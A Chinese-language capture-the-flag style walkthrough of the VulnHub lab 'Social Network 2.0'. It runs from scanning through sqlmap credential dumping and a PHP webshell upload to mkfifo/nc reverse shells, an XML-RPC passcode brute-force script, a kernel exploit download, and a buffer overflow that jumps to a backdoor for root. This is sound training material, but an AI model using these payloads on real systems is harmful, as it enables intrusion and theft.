# 第五周

**靶机名称**:vulnhub---**BoredHackerBlog: Social Network 2.0(hard)**

**靶机链接**:https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/

**难度**:*Hard*

**攻击机**:Kali Linux

**使用工具**:

## 概述

此次靶机难度较高,用到了许多在真实环境中可能不会用到的高难度技巧,如缓冲区溢出、动态调试与逆向等等.

注意,本靶机没有flag,目标为取得root权限.加油吧!

## 主机发现

最终,咱们还是返璞归真.最简单的就是最好用的——arp-scan

`sudo arp-scan -l`

![截屏2021-09-10 下午8.26.43](https://tva1.sinaimg.cn/large/008i3skNly1gubszo8x7yj614q0cq43c02.jpg)

观察mac地址,我们得知`192.168.1.10`为我们的靶机ip

## 端口扫描

这一次的扫描,我们使用一种更为便捷的方式

`sudo nmap -p- -sC -sV --min-rate=1000 -Pn 192.168.1.10`

使用sudo权限运行nmap,默认使用-sS扫描模式,同时指定全端口扫描、服务版本测试、漏洞脚本测试;使用--min-rate指定最小速度为1000(加快扫描速度);由于我们已经知道了主机存在,使用-Pn禁止主机发现,直接扫描.

![截屏2021-09-10 下午8.34.07](https://tva1.sinaimg.cn/large/008i3skNgy1gubt7bidpwj616s0qs47d02.jpg)

OS:Ubuntu

22/ssh OpenSSH7.6p1

80/http Apache httpd 2.4.29

8000/python_http 0.3/2.7.15

可以发现,前两个端口我们都很熟悉了,但是最后一个确实python框架下的http服务.

注意扫描结果中显示:xmlrpc—methods,也许这会是一个提示?

## web页面

### 奇怪的8000端口

我们先来访问一下8000端口吧~

直接在浏览器中打开,咦?报错了?

![截屏2021-09-10 下午8.56.10](https://tva1.sinaimg.cn/large/008i3skNly1gubtu7qw07j60rs09uzl802.jpg)



不接受GET请求?

我们都知道,在http中有多种请求头

GET POST OPTIONS HEAD PUT DELETE TRACE...

我们使用burp,依次将GET换下来,看看服务端能接受哪种请求

经过尝试,除了POST请求产生了不一样的响应,其他都是一样的不接受

我们来看看POST的响应包

![截屏2021-09-10 下午9.00.38](https://tva1.sinaimg.cn/large/008i3skNly1gubtyw23i5j316g0u0q7z.jpg)

返回了类似于python的错误类对象.我们注意到,**这里是使用xml进行编码的**,会有什么关系呢~~~

既然没有头绪,我们不妨先看看正常又亲切的80端口吧.

### 亲爱的80端口

![截屏2021-09-10 下午9.03.18](https://tva1.sinaimg.cn/large/008i3skNgy1gubu1mj5mpj616g0u00v602.jpg)

当我们正想和web服务来个亲密的拥抱时,一道登陆页面拦在了我们面前.

其中有两个功能,一个是登陆,需要使用邮箱加密码.另一个是注册

#### 登录与注册

**登陆功能**:在这种情况下,除非知道用户邮箱,否则是很难爆破的

注册功能:

![截屏2021-09-10 下午9.05.09](https://tva1.sinaimg.cn/large/008i3skNly1gubu3jvo0sj616g0u0acz02.jpg)

还记得我们的靶机名吗?Social_network.(社交网络)

在这种平台注册时需要提供大量信息,在平时渗透中我们也许也会遇到类似的情况,但是请做一个聪明的小朋友,不要傻傻地把自己的真实信息或相关信息填进去了哦?否则~~("FBI Open the door!")

##### 快出来,sql漏洞!

我们先别着急,不妨先试试是否有sql注入漏洞~如果有的话就方便多了~

通过burp代理,拦截登录请求包,保存成文件`bp.pack`,使用`sqlmap`——这款sql注入神器对登陆点进行探测!

`sqlmap -r bp.back --batch --random-agent`

注:	`-r`参数指定数据包文件,`--batch`表示在所有需要用户输入(Y/N)的地方都选择默认参数,`--random-agent`使用随机请求头,防止被检测.当然这些都是小技巧,大家get到就好~

![截屏2021-09-10 下午9.15.50](https://tva1.sinaimg.cn/large/008i3skNgy1gubueq6naej61ta0ioqa802.jpg)

wow!居然真的有sql注入漏洞!

同时我们还知道了:操作系统版本Ubuntu 18.04;数据库MySQL ≥ 5.6

我们使用sqlmap的常规用法,分别获得数据库的名称,其表名,其列名.

此处省略介绍,如果有感兴趣的同学可以自行搜索sqlmap进行学习!

获取数据库名:`sqlmap -r bp.pack --batch --random-agent --dbs`

![截屏2021-09-10 下午9.17.19](https://tva1.sinaimg.cn/large/008i3skNly1gubug6vp6hj60ce05u3yz02.jpg)

我们发现有五个数据库,其中除了第四个——`socialnetwork`,其他数据库都是系统/配置数据库,与实际业务数据无关

我们获取它的表名

`sqlmap -r bp.pack --batch --random-agent -D socialnetwork --tables`

![截屏2021-09-10 下午9.20.25](https://tva1.sinaimg.cn/large/008i3skNly1gubujfrjiij60ay07gweu02.jpg)

有四个表,我们最感兴趣的肯定是users表,快来看看有没有什么好东西吧~

`sqlmap -r bp.pack --batch --random-agent -D socialnetwork -T users --columns`

![截屏2021-09-11 上午10.29.50](https://tva1.sinaimg.cn/large/008i3skNgy1guchcto9l7j60cc08ijry02.jpg)

emmm,很可惜,这个表里没有密码和用户名字段...

##### 注册账号绕过登录,🐂

我们没必要如此辛苦的爆破账号,倒不如直接注册一个账号进去看看吧~

![截屏2021-09-11 上午9.54.41](https://tva1.sinaimg.cn/large/008i3skNly1gucgcaixq8j616g0u0wis02.jpg)

可以看到,功能有很多

1.搜索功能,也许有sql注入漏洞?

2.发布信息,虽然可能存在存储行xss,但是对于打靶是没有太大用处的

3.用户信息,可以查看个人信息面板

4.下方的投稿信息,有admin用户和testuser用户,点击用户名即可查看该用户详细信息

5.看admin用户的投稿,有一个叫做monitor.py的文件正在运行,看来可能会有好东西呢~

#### 主页面功能探索

##### 1.搜索功能

我们先随便输入一个字符,看看它是通过GET还是POST传递参数的.如果是GET,我们可以直接复制链接到sqlmap中进行扫描;如果是POST,我们需要参照上面对登录页面的扫描进行sql注入测试

尝试后发现,是GET传递参数

注:此处表结构与之前一样,但字段不一样,因此省略与跳过前面的数据库与表名检测

`sqlmap -u "http://192.168.1.10/search.php?location=emails&query=1" --random-agent --batch -D socialnetwork -T users --columns`

![截屏2021-09-11 上午10.37.44](https://tva1.sinaimg.cn/large/008i3skNgy1guchl14drrj60g00g240w02.jpg)

真不错,这次表中字段存在用户的更多信息,我们将数据提取出来

`sqlmap -u "http://192.168.1.10/search.php?location=emails&query=1" --random-agent --batch -D socialnetwork -T users -C user_firstname,user_email,user_password --dump`

![截屏2021-09-11 上午10.44.31](https://tva1.sinaimg.cn/large/008i3skNly1guchs5q7a2j612k02wgmp02.jpg)

也许一会我们可以用admin用户登陆再看看是否有其他功能?

(注:使用admin登陆后,功能点类似,此处不再赘述)

##### 2.用户信息界面

我们点击profile功能,竟然显示我们当前没有发布post,没有额外的功能点.我们先随意发布一条post,再回来看看

![截屏2021-09-11 上午10.53.43](https://tva1.sinaimg.cn/large/008i3skNly1guci1o9hldj61ax0u0djb02.jpg)

可以看到,左下角有一个上传头像的功能点.看到上传文件,我们不自觉的想到文件上传漏洞.不如试试看吧~

一般来说,文件上传的检测分为客户端检测和服务端检测.

客户端检测即使用js代码验证文件后缀名等信息,很好绕过

服务端检测则是通过后缀名、文件头等等信息进行验证,需要通过解析漏洞/00截断等功能进行绕过

我们先别想太复杂,万一它没有防护呢~

我们上传一个shell.php文件试试看

居然成功了!我们右键图片->在新标签页中打开图片,发现文件名为3.php,想必是经过了重命名,不过好在后缀名还是php,我们尝试用蚁剑链接吧~

![截屏2021-09-11 上午10.59.13](https://tva1.sinaimg.cn/large/008i3skNly1guci7fzfixj61ax0u0n0902.jpg)

成功获得蚁剑shell~

不过呢,蚁剑的shell可交互性不强,我们尝试用过nc反弹一个shell吧

此次,我们不用串联nc,而是通过fifo的帮助,只通过连接一个nc即实现shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.5 4444 > /tmp/f`

成功获得一个低级shell.

我们使用`python -c "import pty;pty.spawn('/bin/bash')"`获得一个交互级的shell

再通过stty升级FULL TTY shell.详情请查阅打靶第四周.

![截屏2021-09-11 下午10.05.46](https://tva1.sinaimg.cn/large/008i3skNgy1gud1gzqr19j61be078tap02.jpg)

## 提权

### 1.时间的力量

查阅内核版本后,发现为ubuntu18.04.还记得在第一周的打靶过程中和大家介绍的ubuntu最新漏洞吗?

此漏洞于2021年被发现,而此靶机是在2020年制作的.这就导致我们可以通过最新的ubuntu版本通杀漏洞简单的获得root.

在kali打开pythonhttp服务,在靶机使用wget下载exp到本地

`wget http://192.168.1.5/CVE-2021-3493.c`

![截屏2021-09-11 下午10.12.58](https://tva1.sinaimg.cn/large/008i3skNgy1gud1ogivipj61iq0jc79602.jpg)

### 2.漫漫提权路

还记得之前admin发布的帖子吗?有一个叫做monitor.py的文件正在运行

我们使用ps+grep进行查找

`ps -aux | grep monitor`

![截屏2021-09-11 下午10.19.34](https://tva1.sinaimg.cn/large/008i3skNgy1gud1vct5w1j61h403o0ue02.jpg)

发现了,文件在/home/socnet/monitor.py,

我们查看一下这个文件的内容

```python
#my remote server management API
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000,9999)

def runcmd(cmd):
    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = results.stdout.read() + results.stderr.read()
    return output

def cpu():
    return runcmd("cat /proc/cpuinfo")

def mem():
    return runcmd("free -m")

def disk():
    return runcmd("df -h")

def net():
    return runcmd("ip a")

def secure_cmd(cmd,passcode):
    if passcode==debugging_pass:
         return runcmd(cmd)
    else:
        return "Wrong passcode."

server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))
server.register_function(cpu)
server.register_function(mem)
server.register_function(disk)
server.register_function(net)
server.register_function(secure_cmd)

server.serve_forever()

```

这是一个python脚本,其中使用了SimpleXMLRPCServer库

这是什么东西?怎么好像没见过?

我们百度一下看看~

https://docs.python.org/3.6/library/xmlrpc.server.html

分析一下代码,有四个基本的函数用来获取基本信息.

服务开放在8000端口,怪不得之前测试了这么多方式都不行...

其中有一个secure_cmd函数用来执行任意代码,但是需要四位的随机密码~

既然这样,我们就用python编写一个xmlrpc客户端脚本爆破一下密码吧~

```python
#brute-pass.py
import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://192.168.1.10:8000')
for x in range(1000,10000):
    res = s.secure_cmd('id',x)
    if not "Wrong" in res:
        print("Pass:"+str(x))
        break
```

注:密码是每次启动随机生成的,所以各位可千万不要拿着我爆破出来的密码去使用哦,哈哈~

`Pass:6935`

这下我们就获得了密码,可以远程执行指令啦~

我们把指令换成反弹shell~

```python
#get-shell.py
import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://192.168.1.10:8000')
s.secure_cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.5 5555 > /tmp/f',6935)
```

我们成功获得socnet普通用户权限~

#### 动态分析&逆向

我们之前还注意到有另外两个文件

![截屏2021-09-12 下午1.14.08](https://tva1.sinaimg.cn/large/008i3skNly1gudrq3slo6j60pg05cjsi02.jpg)

add_record,一个可执行文件,其中有suid修饰符,而且所属用户还是root!

我想这已经很明显了~

peda文件夹?我们百度一下

https://blog.csdn.net/SmalOSnail/article/details/53149426?locationNum=1&fps=1

这是一个的、gdb的辅助插件,用于逆向分析

看来我们需要用gdb对add_record进行逆向啦~

首先来看看这个文件有什么功能吧~

![截屏2021-09-12 下午1.21.42](https://tva1.sinaimg.cn/large/008i3skNly1gudrxyzcndj60oe09cwg302.jpg)

获取输入,然后写入本地的文件中

看到获取字符串,你想到了什么?~~

字符串溢出~

我们用gdb进行调试吧~

##### 1.加载程序

使用`file add_record`加载程序到gdb中

##### 2.运行&查看内存

使用`run`运行程序,我们尝试构造payload对其进行测试

使用`python -c "print('A'*100)"`快速生成100个A当作输入.

![截屏2021-09-12 下午1.36.09](https://tva1.sinaimg.cn/large/008i3skNly1gudsd20chij60ni0cetb302.jpg)

一般来说会正常退出,我们依次尝试在每个输入点输入100个A,看看会有什么异端~

![截屏2021-09-12 下午1.37.21](https://tva1.sinaimg.cn/large/008i3skNly1gudse98otkj618f0u07ct02.jpg)

报错了~

这里我们需要关注EIP的值

众所周知,cpu所执行的指令为CS:IP,如果我们能控制IP,那我们就可以随意执行代码啦!

100个A好像多了,那我们应该如何确定偏移呢?

`pattern create 100`生成100个有标志的字符串,每四个一组,不会重复.我们可以用它来确定EIP的偏移

然后再次run,在注入点输入payload

然后再输入`pattern search`,自动搜索每个位置的偏移量,结果如下

![截屏2021-09-12 下午1.45.05](https://tva1.sinaimg.cn/large/008i3skNgy1gudsmbz1bzj60sw0jwn2q02.jpg)



这下我们就知道了~EIP的偏移量为62

##### 3.代码审计

接下来,我们对代码进行反汇编,看看函数的执行顺序是什么~

`disas main`显示main函数的内容

我们简单截取一段代码进行分析

```assembly
0x08048822 <+330>:   call   0x8048490 <gets@plt>
   0x08048827 <+335>:   add    esp,0x10
   0x0804882a <+338>:   sub    esp,0xc
   0x0804882d <+341>:   lea    eax,[ebp-0xac]
   0x08048833 <+347>:   push   eax
   0x08048834 <+348>:   call   0x80486ad <vuln>
   0x08048839 <+353>:   add    esp,0x10
   0x0804883c <+356>:   sub    esp,0xc
   0x0804883f <+359>:   lea    eax,[ebx-0x130d]
   0x08048845 <+365>:   push   eax
   0x08048846 <+366>:   call   0x80484e0 <puts@plt>

```

最右边一列为反汇编的代码,其中对于call命令会把函数名显示出来

对于@plt,为系统的函数,而其中有一个函数引起了我们的兴趣,**vuln**

我们都知道,vuln是漏洞的英文简写,这是否意味着这里会有漏洞呢~

我们在这里下一个断点`b *0x08048834`

![截屏2021-09-12 下午1.55.01](https://tva1.sinaimg.cn/large/008i3skNly1gudswx9zydj60w20u0n4t02.jpg)

看来vuln函数正上一步是explain内容,我们上一步找到的注入点!

##### 4.查看其他函数

我们输入`info functions`查看所有函数,不过因为内置的函数太多了,这里介绍一个小妙招

输入`info functions`,然后输入两次tab键,输入y,即只会显示里面用到的函数

![截屏2021-09-12 下午2.03.03](https://tva1.sinaimg.cn/large/008i3skNgy1gudt4z6yvvj60is01wjri02.jpg)

可以看到,有一个函数叫做backdoor?!

我们使用`disas backdoor`详细查看它的信息

![截屏2021-09-12 下午2.06.40](https://tva1.sinaimg.cn/large/008i3skNgy1guduvdjiaoj60qq0iyn1l02.jpg)



这里调用了setuid与system函数,我们把EIP修改为backdoor函数的起始地址0x08048676

`python -c "import struct;print('bszy\n1\n1\n1\n' + 'A'*62 + struct.pack('I',0x08048676))" > payload`

由于内存中使用的是小端字节序,我们需要通过struct库中的pack函数将地址顺序颠倒过来

我们一起将之前的问题生成好,通过换行符结束单个问题的输入

注意:请使用python2生成payload

打开gdb,输入`run < payload`

![截屏2021-09-12 下午3.16.18](https://tva1.sinaimg.cn/large/008i3skNgy1gudv97mftuj60ok088wgg02.jpg)



神奇的事情发生了,我们打开了bash?!

看来这个exp是可以使用的,我们退出gdb,

输入`cat payload - | ./add_record`

成功获得root shell~~

PWN!

![截屏2021-09-12 下午3.23.02](https://tva1.sinaimg.cn/large/008i3skNly1gudvg9ip3pj61cw08s77902.jpg)

## 总结

本次打靶收获颇丰,涉及到了逆向与动态调试的内容

这次,我们通过nmap的更多参数进行快速有效地扫描.(--min-rate)

对于web界面,我们通过简单的文件上传漏洞上传webshell,获得基础权限

我们学习了通过mkfifo结合nc反弹shell,只需要打开一个nc页面即可反弹,比起串联nc方便不少!

这里有一个小插曲,我们通过2021年最新的ubuntu漏洞获得了这台2020年靶机的root权限,时间的伟力!

在web应用中,我们信息收集注意到monitor.py文件.通过ps发现文件,并对其进行代码审计,搜索python xmlrpc库的使用方法,通过编写python脚本进行应用密码爆破与反弹shell

特殊地,我们通过gdb的动态调试与逆向分析发现了字符串溢出漏洞,在对函数的检索中发现后门,最终通过编写exp生成payload成功覆盖EIP执行后门程序,获得root shell!

最后,希望大家能加强gdb的指令使用,熟练地进行逆向分析.

渗透测试从来都不是简简单单的web渗透,它包罗万象,希望大家能在这条路上坚持下去,广泛搜索、终身学习!

## 附录

Ubuntu漏洞exploit:	**CVE-2021-3493.c**

爆破python-xmlrpc应用密码:**brute-pass.py**

利用python-xmlrpc反弹shell:**get-shell.py**

使用mkfifo+nc反弹shell:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> > /tmp/f`

